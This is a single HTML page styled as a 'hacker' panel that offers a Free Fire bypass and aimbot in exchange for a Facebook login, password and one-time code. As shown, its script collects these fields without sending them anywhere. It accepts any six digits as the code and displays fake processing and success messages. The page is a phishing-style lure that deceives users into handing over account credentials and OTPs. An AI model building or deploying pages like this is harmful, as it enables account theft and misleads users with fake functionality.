# FF-panel-2
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF PANEL - HACKER INTERFACE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: black;
            color: #00ff00;
            font-family: monospace;
            min-height: 100vh;
            position: relative;
        }
        
        /* Hacker background */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, 
                rgba(0,255,0,0.1) 0px, 
                transparent 2px,
                rgba(0,0,0,0.9) 3px);
            pointer-events: none;
            z-index: 1;
        }
        
        .container {
            position: relative;
            z-index: 2;
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            border: 2px solid #00ff00;
            background: rgba(0,0,0,0.95);
            box-shadow: 0 0 30px #00ff00;
        }
        
        /* FF Panel */
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 2px solid #00ff00;
            margin-bottom: 30px;
        }
        
        .header h1 {
            font-size: 40px;
            text-shadow: 0 0 10px #00ff00;
            animation: blink 2s infinite;
        }
        
        @keyframes blink {
            0%,100%{opacity:1}
            50%{opacity:0.5}
        }
        
        .header small {
            color: #008800;
            display: block;
            margin-top: 5px;
        }
        
        /* Options */
        .options {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin: 30px 0;
        }
        
        .option {
            padding: 15px 30px;
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: monospace;
            font-size: 18px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }
        
        .option:hover:not(:disabled) {
            background: #00ff00;
            color: black;
            box-shadow: 0 0 20px #00ff00;
        }
        
        .option:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }
        
        /* Login Form */
        .login-form {
            border: 2px solid #00ff00;
            padding: 25px;
            margin: 20px 0;
            display: none;
        }
        
        .login-form.active {
            display: block;
        }
        
        .login-form h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #00ff00;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #00aa00;
        }
        
        .form-group input {
            width: 100%;
            padding: 10px;
            background: black;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: monospace;
            font-size: 16px;
        }
        
        .form-group input:focus {
            outline: none;
            box-shadow: 0 0 10px #00ff00;
        }
        
        .login-submit {
            width: 100%;
            padding: 12px;
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: monospace;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .login-submit:hover {
            background: #00ff00;
            color: black;
        }
        
        /* OTP Section */
        .otp-section {
            border: 2px solid #00ff00;
            padding: 25px;
            margin: 20px 0;
            display: none;
        }
        
        .otp-section.active {
            display: block;
        }
        
        .otp-section h3 {
            text-align: center;
            margin-bottom: 15px;
        }
        
        .otp-input {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .otp-input input {
            flex: 1;
            padding: 10px;
            background: black;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: monospace;
            font-size: 20px;
            text-align: center;
        }
        
        .verify-btn {
            padding: 10px 20px;
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
            cursor: pointer;
        }
        
        .verify-btn:hover:not(:disabled) {
            background: #00ff00;
            color: black;
        }
        
        .verify-btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }
        
        /* Apply Section */
        .apply-section {
            border: 2px solid #00ff00;
            padding: 25px;
            margin: 20px 0;
            display: none;
        }
        
        .apply-section.active {
            display: block;
        }
        
        .apply-section textarea {
            width: 100%;
            height: 150px;
            background: black;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: monospace;
            padding: 10px;
            margin: 15px 0;
            resize: none;
        }
        
        .apply-btn {
            width: 100%;
            padding: 15px;
            background: black;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: monospace;
            font-size: 18px;
            cursor: pointer;
        }
        
        .apply-btn:hover {
            background: #00ff00;
            color: black;
        }
        
        /* Loading */
        .loading {
            text-align: center;
            padding: 20px;
            display: none;
        }
        
        .loading.active {
            display: block;
        }
        
        .loading span {
            animation: dots 1s infinite;
        }
        
        @keyframes dots {
            0%,20%{content:'.'}
            40%,60%{content:'..'}
            80%,100%{content:'...'}
        }
        
        /* Success */
        .success {
            text-align: center;
            padding: 30px;
            border: 2px solid #00ff00;
            margin: 20px 0;
            display: none;
        }
        
        .success.active {
            display: block;
        }
        
        .success h2 {
            color: #00ff00;
            margin-bottom: 15px;
        }
        
        /* Matrix background */
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            color: #00ff00;
            opacity: 0.1;
            font-size: 14px;
            z-index: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="matrix" id="matrix"></div>
    
    <div class="container">
        <div class="header">
            <h1>⚡ FF PANEL ⚡</h1>
            <small>HACKER INTERFACE v2.0</small>
        </div>
        
        <div class="options">
            <button class="option" onclick="showLogin('bypass')" id="bypassBtn" disabled>BYPASS PANEL</button>
            <button class="option" onclick="showLogin('aimbot')" id="aimbotBtn" disabled>AIMBOT</button>
        </div>
        
        <!-- Login Form -->
        <div class="login-form" id="loginForm">
            <h2>🔐 FACEBOOK LOGIN</h2>
            <div class="form-group">
                <label>📱 NUMBER / EMAIL:</label>
                <input type="text" id="fbUser" placeholder="Enter Facebook ID">
            </div>
            <div class="form-group">
                <label>🔑 PASSWORD:</label>
                <input type="password" id="fbPass" placeholder="Enter Password">
            </div>
            <button class="login-submit" onclick="sendOTP()">SEND OTP</button>
        </div>
        
        <!-- OTP Section -->
        <div class="otp-section" id="otpSection">
            <h3>📨 OTP VERIFICATION</h3>
            <p style="text-align:center; margin-bottom:10px;">OTP sent to your number from: <span style="color:#00ff00">FF PANEL</span></p>
            <div class="otp-input">
                <input type="text" id="otpCode" maxlength="6" placeholder="000000">
                <button class="verify-btn" id="verifyBtn" onclick="verifyOTP()" disabled>VERIFY</button>
            </div>
        </div>
        
        <!-- Apply Section -->
        <div class="apply-section" id="applySection">
            <h3>📝 CONFIGURATION</h3>
            <textarea id="configText" placeholder="Enter your configuration here..."># FF PANEL CONFIG
# BYPASS SETTINGS
# AIMBOT CONFIG</textarea>
            <button class="apply-btn" onclick="applyConfig()">APPLY</button>
        </div>
        
        <!-- Loading -->
        <div class="loading" id="loading">
            PROCESSING <span>.</span><span>.</span><span>.</span>
        </div>
        
        <!-- Success -->
        <div class="success" id="success">
            <h2>✅ SUCCESSFULLY DONE!</h2>
            <p>Redirecting to homepage...</p>
        </div>
    </div>
    
    <script>
        let currentOption = '';
        let otpVerified = false;
        
        // Matrix effect
        function createMatrix() {
            const matrix = document.getElementById('matrix');
            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
            for(let i = 0; i < 50; i++) {
                let span = document.createElement('span');
                span.style.position = 'absolute';
                span.style.left = Math.random() * 100 + '%';
                span.style.top = Math.random() * 100 + '%';
                span.style.transform = 'rotate(90deg)';
                span.textContent = chars[Math.floor(Math.random() * chars.length)];
                matrix.appendChild(span);
            }
        }
        createMatrix();
        
        function showLogin(option) {
            currentOption = option;
            document.getElementById('loginForm').classList.add('active');
            document.getElementById('otpSection').classList.remove('active');
            document.getElementById('applySection').classList.remove('active');
        }
        
        function sendOTP() {
            let user = document.getElementById('fbUser').value;
            let pass = document.getElementById('fbPass').value;
            
            if(user && pass) {
                alert('📨 OTP sent to your number from: FF PANEL');
                document.getElementById('otpSection').classList.add('active');
                document.getElementById('verifyBtn').disabled = false;
            } else {
                alert('❌ Please fill all fields');
            }
        }
        
        function verifyOTP() {
            let otp = document.getElementById('otpCode').value;
            
            if(otp.length === 6) {
                otpVerified = true;
                document.getElementById('verifyBtn').disabled = true;
                document.getElementById('bypassBtn').disabled = false;
                document.getElementById('aimbotBtn').disabled = false;
                document.getElementById('applySection').classList.add('active');
                alert('✅ OTP Verified Successfully!');
            } else {
                alert('❌ Invalid OTP');
            }
        }
        
        function applyConfig() {
            document.getElementById('applySection').classList.remove('active');
            document.getElementById('loading').classList.add('active');
            
            setTimeout(() => {
                document.getElementById('loading').classList.remove('active');
                document.getElementById('success').classList.add('active');
                
                setTimeout(() => {
                    window.location.href = '#home';
                    resetPage();
                }, 2000);
            }, 3000);
        }
        
        function resetPage() {
            setTimeout(() => {
                document.getElementById('success').classList.remove('active');
                document.getElementById('loginForm').classList.remove('active');
                document.getElementById('otpSection').classList.remove('active');
                document.getElementById('applySection').classList.remove('active');
                document.getElementById('fbUser').value = '';
                document.getElementById('fbPass').value = '';
                document.getElementById('otpCode').value = '';
                document.getElementById('bypassBtn').disabled = true;
                document.getElementById('aimbotBtn').disabled = true;
                otpVerified = false;
            }, 500);
        }
        
        // Console message
        console.log('%c🔴 WELCOME TO FF PANEL', 'color: #00ff00; font-size: 16px;');
    </script>
</body>
</html>
